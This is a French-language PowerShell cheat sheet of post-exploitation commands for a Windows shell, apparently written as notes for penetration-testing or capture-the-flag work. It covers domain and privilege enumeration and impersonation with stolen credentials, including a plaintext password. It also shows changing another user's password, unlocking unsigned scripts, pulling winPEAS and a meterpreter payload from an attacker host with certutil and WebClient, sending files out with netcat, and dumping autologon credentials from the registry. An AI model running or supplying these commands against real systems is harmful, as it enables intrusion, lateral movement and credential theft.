# Powershell

> Tips et commandes lorsque l'on a une invite de commande powershell.



### 1. Enumération

- Lister les fichiers cachés :

  ```powershell
  ls -Fo
  ```

- Lister ses privilèges / groupes / utilisateur :

  ```powershell
  whoami /all
  ```

- Liste des administrateurs locaux :

  ```powershell
  net localgroup administrators
  ```

- Liste des sessions powershell actives et disponibles :

  ```powershell
  get-pssession -computername <NOM_PC>
  ```

- Lister les utilisateurs du domaine / savoir si la machine est reliée à un AD :

  ```powershell
  net user /domain
  ```

- Equivalent de GREP et FIND :

  ```powershell
  # Trouver tous les fichiers JSON sur une machine
  Get-ChildItem -Path "C:\Windows\*.json" -Recure
  
  # Faire des greps sur les fichiers txt d'une machine
  Get-ChildItem -Path "D:\Script\*.txt" -Recurse | Select-String -Pattern 'PATTERN'
  
  # Avec exclusion des fichiers de merde
  Get-Childitem –Path 'C:\program files'  -Exclude *.JPG,*.MP3,*.TMP, *.DLL -File -Recurse -ErrorAction SilentlyContinue

- Regarder si le service de spool est activé pour l'attaque `Print-nightmare` :

  ```powershell
  Get-Service -Name Spooler
  ```

- Récupérer les informations réseaux (IP, passerelle, ...) :

  ```powershell
  ipconfig
  ```

- Connaitre l'architecture de la machine :

  ```powershell
  powershell.exe -c "[Environment]::Is64BitProcess"
  # True ou False
  ```

  

### 2. Exécution de commandes

> Exécuter des commandes avec les droits d'un autre utilisateur que soi
>
> Objectifs : multiples, changer le mot de passe d'un autre utilisateur par exemple
>
> https://blog.atwork.at/post/Run-PowerShell-script-as-different-user
>
> https://www.thehacker.recipes/ad/movement/credentials/impersonation

- Première partie, setup les identifiants dans des variables :

  ```powershell
  # Première méthode
  # Récupération d'un mot de passe "secure" ($mp)
  $username = '<USER>'
  # Création d'un objet contenant les identifiants de l'utilisateur qu'on cherche à se faire passer pour
  $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $mp.SecureCurrentPassword
  
  # Deuxième méthode, sous condition d'avoir un prompt powershell
  # https://cheats.philkeeble.com/active-directory/lateral-movement#psremoting
  $cred = Get-Credential Domain\Username
  
  # 3ème méthode, en ayant le mot de passe en clair
  $passwd=ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
  $cred=New-Object System.Management.Automation.PSCredential("acute\imonks", $passwd)
  ```

- Deuxième partie, exécuter des commandes locales, avec les identifiants créés :

  ```powershell
  # Exemple : Changement du mot de passe d'un autre utilisateur en utilisant les droits de l'utilisateur "volé"
  # -ComputerName : le PC sur lequel on veut exécuter une commande
  # -ConfigurationName : les restrictions associées à la session si 
  Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {net user <DOMAIN_USER> <NEW_PASSWORD>} -ConfigurationName dc_manage
  
  # Pas obligé d'avoir setup les credentials, un prompt les demandes
  Invoke-command -Credential $cred -computername x -scriptblock {whoami}
  ```



### 3. Politique d'exécution .ps1

> Consulter et modifier la politique d'exécution pour autoriser l'exécution d'un ps1 non signé par Microsoft

```cmd
Get-ExecutionPolicy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```



### 4. Utilitaires

- Upload un fichier sur la machine cible :

  ```powershell
  # Certutil
  certutil.exe -urlcache -f "http://10.10.16.6:8000/winPEASx86.exe" winPEASx86.exe
  
  # Webclient
  $WebClient = New-Object System.Net.WebClient
  $WebClient.DownloadFile("http://<IP_HOTE>:5655/meterpreter.exe","C:\windows\temp\meterpreter.exe")
  ```

- Télécharger un fichier présent sur la cible Windows vers son hôte Linux :

  ```powershell
  # Uploader auparavant un binaire nc64.exe (ou 32 selon l'architecture)
  cat .\res.txt | .\nc64.exe <IP_HOTE> 5655
  ```

- Remplacer du contenu d'un fichier par un autre :

  ```powershell
  (Get-Content -Path C:\Users\<FICHIER>) -replace '<CHAINE_A_REMPLACER>','NOUVELLE_CHAINE' | Set-Content -Path C:\Users\<FICHIER>)
  ```

- Lire une clé de registre : 

  ```powershell
  # Changer la clé de registre bien entendu
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
  
  # Autre manière, ici de dump les identifiants pouvant être présents via autologon
  Get-ItemProperty -path 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'
  ```
